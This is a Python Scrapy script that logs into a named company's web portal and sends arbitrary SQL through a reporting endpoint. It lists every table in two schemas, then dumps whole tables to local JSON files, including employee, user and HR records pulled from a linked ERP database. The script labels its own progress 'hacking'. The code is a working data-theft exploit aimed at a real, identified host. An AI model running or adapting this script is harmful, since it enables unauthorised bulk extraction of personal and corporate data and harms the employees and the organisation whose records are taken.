# -*- coding: utf-8 -*-
import requests,json
from scrapy import Spider
from re import compile
from lxml.html import fromstring

class SieSpider(Spider):

  name="sie"
  '''
  custom_settings = {
    'DOWNLOAD_DELAY':'2.5',  #对requests的请求无效
  }
  '''

  def start_requests(self):

    s = requests.session()
    r=s.get('http://saip.chinasie.com:8089/siebpm/cmslogin.jsp')
    response=fromstring(r.text)
    regex = compile(r"name='service' value='(.+?)' /> ")
    service=response.xpath('//input[@name="service"]/@value')[0]
    #service=regex.search(r.text).group(1)   #either

    data = {
      'username': '***',
      'password': '***',
      'service': service,
    }
    s.post('http://saip.chinasie.com:8089/siebpm/ssoauth', data=data)  # get cookies
    s.headers.update({'Content-Type': 'application/json; charset=UTF-8'})  # 不可缺少 ！！

    req_url = 'http://saip.chinasie.com:8089/siebpm/ireport/com.cms.ireport.parseSQL.queryReportDataBySqlWithPage.biz.ext'
    payload = {
      "dsName": "default",
      "pageSize": 1000,
      "page": {"length": 1000, "isCount": "true"}
    }

    user = ('SAIP', 'SIEWX',)
    table = []
    for _ in user:
      payload['sqlContext'] = "SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='TABLE' AND OWNER='{}'".format(
        _)  # get tables
      for i in range(1000):
        payload['pageIndex'] = i
        payload['page']['begin'] = i * int(payload['pageSize'])
        dic = s.post(req_url, data=json.dumps(payload)).json()  # 针对Request Payload
        table+=["{}.{}".format(_, data['OBJECT_NAME']) for data in dic['item']]
        # print(dic['item'])
        if dic['page']['isLast']:
          break

    table+=['om_employee',
            'om_organization',
            'apps.fnd_flex_values_vl@erp_to_saip',
            'fnd_user@erp_to_saip',
            'om_emp_pos_org_relation_vl',
            'PER_ALL_ASSIGNMENTS_F@erp_to_saip',
            'PER_JOBS@erp_to_saip',
            'PER_PEOPLE_F@erp_to_saip',]
  
    for _ in table:
      payload['sqlContext'] = "select * from {}".format(_)  # can not end with ';'
      f = open('{}.json'.format(_), 'w',encoding='utf-8')
      for i in range(1000):
        payload['pageIndex'] = i
        payload['page']['begin'] = i * int(payload['pageSize'])
        dic = s.post(req_url, data=json.dumps(payload)).json()  # 针对Request Payload
        for data in dic['item']:
          f.write(json.dumps(data,ensure_ascii=False)+'\n')
        print('hacking {} {}'.format(_, i))
        if dic['page'].get('isLast', True):
          f.write('{}\n{}'.format(dic['page'], i))
          f.close()
          break

    yield self.make_requests_from_url('http://www.whatismyip.com.tw')


  def parse(self,response):
    pass
